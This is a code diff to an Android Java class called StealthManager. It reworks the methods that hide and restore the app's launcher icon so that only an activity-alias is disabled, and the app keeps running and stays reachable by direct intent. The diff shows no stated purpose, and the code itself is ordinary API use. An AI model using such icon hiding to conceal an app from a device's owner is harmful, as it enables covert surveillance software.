@@ -44,36 +44,39 @@ public class StealthManager {
     }
 
     /**
-     * Hide app icon from launcher
+     * Returns the ComponentName of the launcher alias.
+     * Only the alias is toggled — MainActivity itself is NEVER disabled
+     * so the app can always be opened via a direct explicit intent.
+     */
+    private ComponentName launcherAliasComponent() {
+        return new ComponentName(context.getPackageName(),
+                                 context.getPackageName() + ".LauncherAlias");
+    }
+
+    /**
+     * Hide app icon from launcher.
+     * Disables only the activity-alias so the icon disappears from the drawer,
+     * while MainActivity stays fully enabled and reachable via direct intent.
      */
     public JSONObject hideAppIcon() {
         JSONObject result = new JSONObject();
         
         try {
-            PackageManager packageManager = context.getPackageManager();
-            
-            // Get launcher activity component
-            ComponentName componentName = new ComponentName(
-                context.getPackageName(),
-                context.getPackageName() + ".MainActivity"
-            );
-            
-            // Disable launcher activity (hides icon)
-            packageManager.setComponentEnabledSetting(
-                componentName,
+            PackageManager pm = context.getPackageManager();
+
+            // Disable the launcher alias only — MainActivity remains open
+            pm.setComponentEnabledSetting(
+                launcherAliasComponent(),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             );
             
-            // Save state
             context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
-                .edit()
-                .putBoolean(KEY_ICON_HIDDEN, true)
-                .apply();
+                .edit().putBoolean(KEY_ICON_HIDDEN, true).apply();
 
             result.put("success", true);
-            result.put("message", "App icon hidden");
-            result.put("note", "App still runs in background. Use unhide to restore icon.");
+            result.put("message", "App icon hidden from launcher");
+            result.put("note", "App still runs and can be opened via direct intent. Use unhide to restore icon.");
             
         } catch (Exception e) {
             try {
@@ -88,34 +91,25 @@ public class StealthManager {
     }
 
     /**
-     * Show app icon in launcher
+     * Show app icon in launcher by re-enabling the launcher alias.
      */
     public JSONObject showAppIcon() {
         JSONObject result = new JSONObject();
         
         try {
-            PackageManager packageManager = context.getPackageManager();
-            
-            ComponentName componentName = new ComponentName(
-                context.getPackageName(),
-                context.getPackageName() + ".MainActivity"
-            );
-            
-            // Enable launcher activity (shows icon)
-            packageManager.setComponentEnabledSetting(
-                componentName,
+            PackageManager pm = context.getPackageManager();
+
+            pm.setComponentEnabledSetting(
+                launcherAliasComponent(),
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP
             );
             
-            // Save state
             context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
-                .edit()
-                .putBoolean(KEY_ICON_HIDDEN, false)
-                .apply();
+                .edit().putBoolean(KEY_ICON_HIDDEN, false).apply();
 
             result.put("success", true);
-            result.put("message", "App icon visible");
+            result.put("message", "App icon restored in launcher");
             
         } catch (Exception e) {
             try {
